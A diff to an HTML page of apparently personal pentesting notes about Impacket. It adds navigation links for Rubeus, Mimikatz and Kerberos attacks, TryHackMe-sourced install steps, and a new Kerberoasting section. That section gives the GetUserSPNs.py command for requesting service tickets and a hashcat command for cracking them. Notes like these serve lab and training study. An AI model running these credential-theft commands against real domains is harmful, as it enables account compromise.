@@ -481,6 +481,11 @@ const thebe_selector_output = ".output, .cell_output"
   </a>
  </li>
  <li class="toctree-l1">
+  <a class="reference internal" href="Rubeus.html">
+   Rubeus
+  </a>
+ </li>
+ <li class="toctree-l1">
   <a class="reference internal" href="Evil-WinRM.html">
    Evil-WinRM
   </a>
@@ -508,6 +513,11 @@ const thebe_selector_output = ".output, .cell_output"
  <li class="toctree-l1">
   <a class="reference internal" href="ReverseEngineering.html">
    Reverse Engineering
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="Mimikatz.html">
+   MimiKatz
   </a>
  </li>
 </ul>
@@ -647,6 +657,11 @@ const thebe_selector_output = ".output, .cell_output"
  <li class="toctree-l1">
   <a class="reference internal" href="../Craft/CiscoProgramming.html">
    Cisco Programming
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../Craft/Kerberos.html">
+   Kerberos Attacks
   </a>
  </li>
 </ul>
@@ -857,6 +872,11 @@ title="Print to PDF"
   </a>
  </li>
  <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#kerberoasting">
+   Kerberoasting
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
   <a class="reference internal nav-link" href="#example-scripts">
    Example Scripts
   </a>
@@ -872,11 +892,6 @@ title="Print to PDF"
     </a>
    </li>
   </ul>
- </li>
- <li class="toc-h2 nav-item toc-entry">
-  <a class="reference internal nav-link" href="#another-install-method">
-   Another Install Method
-  </a>
  </li>
 </ul>
 
@@ -903,6 +918,11 @@ title="Print to PDF"
   </a>
  </li>
  <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#kerberoasting">
+   Kerberoasting
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
   <a class="reference internal nav-link" href="#example-scripts">
    Example Scripts
   </a>
@@ -918,11 +938,6 @@ title="Print to PDF"
     </a>
    </li>
   </ul>
- </li>
- <li class="toc-h2 nav-item toc-entry">
-  <a class="reference internal nav-link" href="#another-install-method">
-   Another Install Method
-  </a>
  </li>
 </ul>
 
@@ -945,6 +960,33 @@ title="Print to PDF"
 pip3 install -r /opt/impacket/requirements.txt <br>
 cd /opt/impacket/ &amp;&amp; python3 ./setup.py install <br></p>
 </div></blockquote>
+<hr>
+<p>Another Page recommends 0.9.20 + are quite unstable, try 0.9.19<br>
+<a class="reference external" href="https://tryhackme.com/room/attackingkerberos">https://tryhackme.com/room/attackingkerberos</a><br></p>
+<blockquote>
+<div><p>cd /opt<br>
+wget <a class="reference external" href="https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_19/impacket-0.9.19.tar.gz">https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_19/impacket-0.9.19.tar.gz</a><br>
+unpack it<br>
+cd Impacket-0.9.19<br>
+pip install .<br></p>
+</div></blockquote>
+<hr>
+<p>And another…<br></p>
+<p>This is taken from <a class="reference external" href="https://tryhackme.com/room/zer0logon">https://tryhackme.com/room/zer0logon</a><br></p>
+<blockquote>
+<div><p>python3 -m pip install virtualenv<br>
+python3 -m virtualenv impacketEnv<br>
+source impacketEnv/bin/activate<br>
+pip install git+https://github.com/SecureAuthCorp/impacket<br></p>
+</div></blockquote>
+<hr></section>
+<section id="kerberoasting">
+<h2>Kerberoasting<a class="headerlink" href="#kerberoasting" title="Permalink to this headline">#</a></h2>
+<blockquote>
+<div><p>cd/usr/share/doc/python3-impacket/examples
+sudo python3 <a class="reference external" href="http://GetUserSPNs.py">GetUserSPNs.py</a> [domain]/[Machine1:Password1] -dc-ip [DC IP] -request
+pass dumps to hashcat: hashcat -m 13100 -a 0 hash.txt wordlist.txt</p>
+</div></blockquote>
 <hr></section>
 <section id="example-scripts">
 <h2>Example Scripts<a class="headerlink" href="#example-scripts" title="Permalink to this headline">#</a></h2>
@@ -957,6 +999,7 @@ sudo wget <a class="reference external" href="https://raw.githubusercontent.com/
 </div></blockquote>
 <p>You can then run the script, be aware that the Domain needs a / at the end (Red arrow). The Blue arrow is the target IP
 <img alt="Impacket_GetNPUsersExample.png" src="../_images/Impacket_GetNPUsersExample.png" /></p>
+<hr>
 </section>
 <section id="secretsdump-py">
 <h3><a class="reference external" href="http://SecretsDump.py">SecretsDump.py</a><a class="headerlink" href="#secretsdump-py" title="Permalink to this headline">#</a></h3>
@@ -968,14 +1011,6 @@ sudo python3 <a class="reference external" href="http://secretsdump.py">secretsd
 <p><img alt="Impacket_SecretsDumpExample.png" src="../_images/Impacket_SecretsDumpExample.png" /></p>
 <hr></section>
 </section>
-<section id="another-install-method">
-<h2>Another Install Method<a class="headerlink" href="#another-install-method" title="Permalink to this headline">#</a></h2>
-<p>This is taken from <a class="reference external" href="https://tryhackme.com/room/zer0logon">https://tryhackme.com/room/zer0logon</a></p>
-<p>python3 -m pip install virtualenv
-python3 -m virtualenv impacketEnv
-source impacketEnv/bin/activate
-pip install git+https://github.com/SecureAuthCorp/impacket</p>
-<hr></section>
 </section>
 
     <script type="text/x-thebe-config">
